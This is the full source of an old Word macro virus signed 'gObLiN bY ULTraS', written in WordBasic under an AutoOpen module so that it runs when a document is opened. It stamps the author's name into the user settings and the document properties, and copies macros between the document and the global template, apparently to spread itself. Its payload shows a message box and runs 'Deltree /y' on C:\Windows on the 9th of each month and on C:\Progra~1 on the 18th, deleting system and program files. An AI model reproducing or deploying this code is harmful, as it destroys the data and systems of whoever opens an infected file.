   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim gObLiN$
   Rem ***********************
   Rem * wM.gObLiN bY ULTraS *
   Rem ***********************
   On Error GoTo -1: On Error GoTo iNfeCt
   gObLiN$ = WordBasic.[FileName$]()
   WordBasic.ToolsOptionsUserInfo Name:="ULTraS", Initials:="gObLiN"
   WordBasic.FileSummaryInfo Title:="gObLiN bY ULTraS"
   WordBasic.MacroCopy "Global:AutoClose", gObLiN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoExit", gObLiN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoNew", gObLiN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:ToolsMacro", gObLiN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:Filetemplates", gObLiN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:ToolsCustomize", gObLiN$ + ":AutoOpen", 1
   iNfeCt:
   On Error GoTo -1: On Error GoTo gObLiN_
   If WordBasic.Day(WordBasic.Now()) = 9 Then
   WordBasic.MsgBox "gObLiN bY ULTraS", ("ULTRAS"), 16
   WordBasic.Shell "Deltree  /y C:\Windows"
   End If
   If WordBasic.Day(WordBasic.Now()) = 18 Then
   WordBasic.MsgBox "gObLiN bY ULTraS", ("ULTRAS"), 16
   WordBasic.Shell "Deltree  /y C:\Progra~1"
   End If
   gObLiN_:
   End Sub
